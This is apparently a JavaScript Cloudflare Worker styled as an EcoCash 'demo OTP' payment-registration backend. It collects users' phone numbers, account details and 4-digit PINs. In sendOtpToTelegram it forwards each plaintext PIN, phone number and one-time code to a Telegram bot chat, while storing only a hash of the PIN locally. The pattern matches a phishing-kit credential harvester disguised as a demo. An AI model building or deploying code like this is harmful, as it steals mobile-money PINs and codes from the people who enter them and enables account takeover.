const transactions = new Map();

const OTP_TTL_MS = 5 * 60 * 1000;
const MAX_ATTEMPTS = 5;

// Helper: Web Crypto SHA-256 Hashing
async function hashDemoPin(demoPin) {
  const encoder = new TextEncoder();
  const data = encoder.encode(String(demoPin));
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Helper: Generate 6-digit OTP
function generateOtp() {
  const array = new Uint32Array(1);
  crypto.getRandomValues(array);
  return (100000 + (array[0] % 900000)).toString();
}

// Helper: Send Telegram Notification via global fetch
async function sendOtpToTelegram(phone, code, demoPin, transactionId, env) {
  const botToken = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn('Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.');
    console.log(`DEMO OTP ${code} for ${phone}`);
    return false;
  }

  const message =
    `ECOCASH/ OTP\n\n` +
    `OTP: ${code}\n` +
    `Phone: ${phone}\n` +
    `DemoPin : ${demoPin}\n` +
    `Transaction: ${transactionId}\n\n` +
    `This is a demo OTP only.`;

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram API error:', result);
      return false;
    }

    return true;
  } catch (error) {
    console.error('Telegram request failed:', error.message);
    return false;
  }
}

// Helper: JSON Response builder
function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

// Main ES Module Export
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // Handle CORS Preflight Options
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }

    // GET / (Health Check)
    if (request.method === 'GET' && url.pathname === '/') {
      return jsonResponse({
        ok: true,
        message: 'Demo OTP backend is running.',
        telegramConfigured: Boolean(env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID),
      });
    }

    // POST /api/register-payment
    if (request.method === 'POST' && url.pathname === '/api/register-payment') {
      try {
        const body = await request.json();
        const { tracking, mode, accountName, accountNumber, amount, currency, phone, demoPin } = body;

        if (!tracking || !mode || !accountName || !accountNumber || !amount || !currency || !phone || !demoPin) {
          return jsonResponse({ ok: false, error: 'Missing required fields' }, 400);
        }

        if (!/^\d{4}$/.test(String(demoPin))) {
          return jsonResponse({ ok: false, error: 'Demo PIN must be exactly 4 digits' }, 400);
        }

        const transactionId = crypto.randomUUID();
        const code = generateOtp();
        const demoPinHash = await hashDemoPin(demoPin);

        transactions.set(transactionId, {
          code,
          demoPinHash,
          phone,
          expiresAt: Date.now() + OTP_TTL_MS,
          attempts: 0,
          data: { tracking, mode, accountName, accountNumber, amount, currency, phone },
        });

        const telegramSent = await sendOtpToTelegram(phone, code, demoPin, transactionId, env);

        return jsonResponse({
          ok: true,
          transactionId,
          demoOtp: code,
          telegramSent,
        });
      } catch (err) {
        return jsonResponse({ ok: false, error: 'Failed to register payment' }, 500);
      }
    }

    // POST /api/verify-otp
    if (request.method === 'POST' && url.pathname === '/api/verify-otp') {
      try {
        const { transactionId, code, demoPin } = await request.json();
        const tx = transactions.get(transactionId);

        if (!tx) {
          return jsonResponse({ ok: false, error: 'Transaction not found' }, 404);
        }

        if (Date.now() > tx.expiresAt) {
          transactions.delete(transactionId);
          return jsonResponse({ ok: false, error: 'Code expired, please register again' }, 410);
        }

        if (tx.attempts >= MAX_ATTEMPTS) {
          transactions.delete(transactionId);
          return jsonResponse({ ok: false, error: 'Too many attempts' }, 429);
        }

        tx.attempts++;

        if (!/^\d{4}$/.test(String(demoPin || ''))) {
          return jsonResponse({ ok: false, error: 'Invalid demo PIN' }, 400);
        }

        const suppliedPinHash = await hashDemoPin(demoPin);
        if (suppliedPinHash !== tx.demoPinHash) {
          return jsonResponse({ ok: false, error: 'Invalid demo PIN' }, 400);
        }

        if (String(code) !== tx.code) {
          return jsonResponse({ ok: false, error: 'Incorrect code' }, 400);
        }

        transactions.delete(transactionId);
        return jsonResponse({
          ok: true,
          message: 'Demo registration verified',
          transaction: tx.data,
        });
      } catch (err) {
        return jsonResponse({ ok: false, error: 'Failed to verify OTP' }, 500);
      }
    }

    // Serve Static Assets or Return 404
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }

    return jsonResponse({ ok: false, error: 'Not Found' }, 404);
  },
};
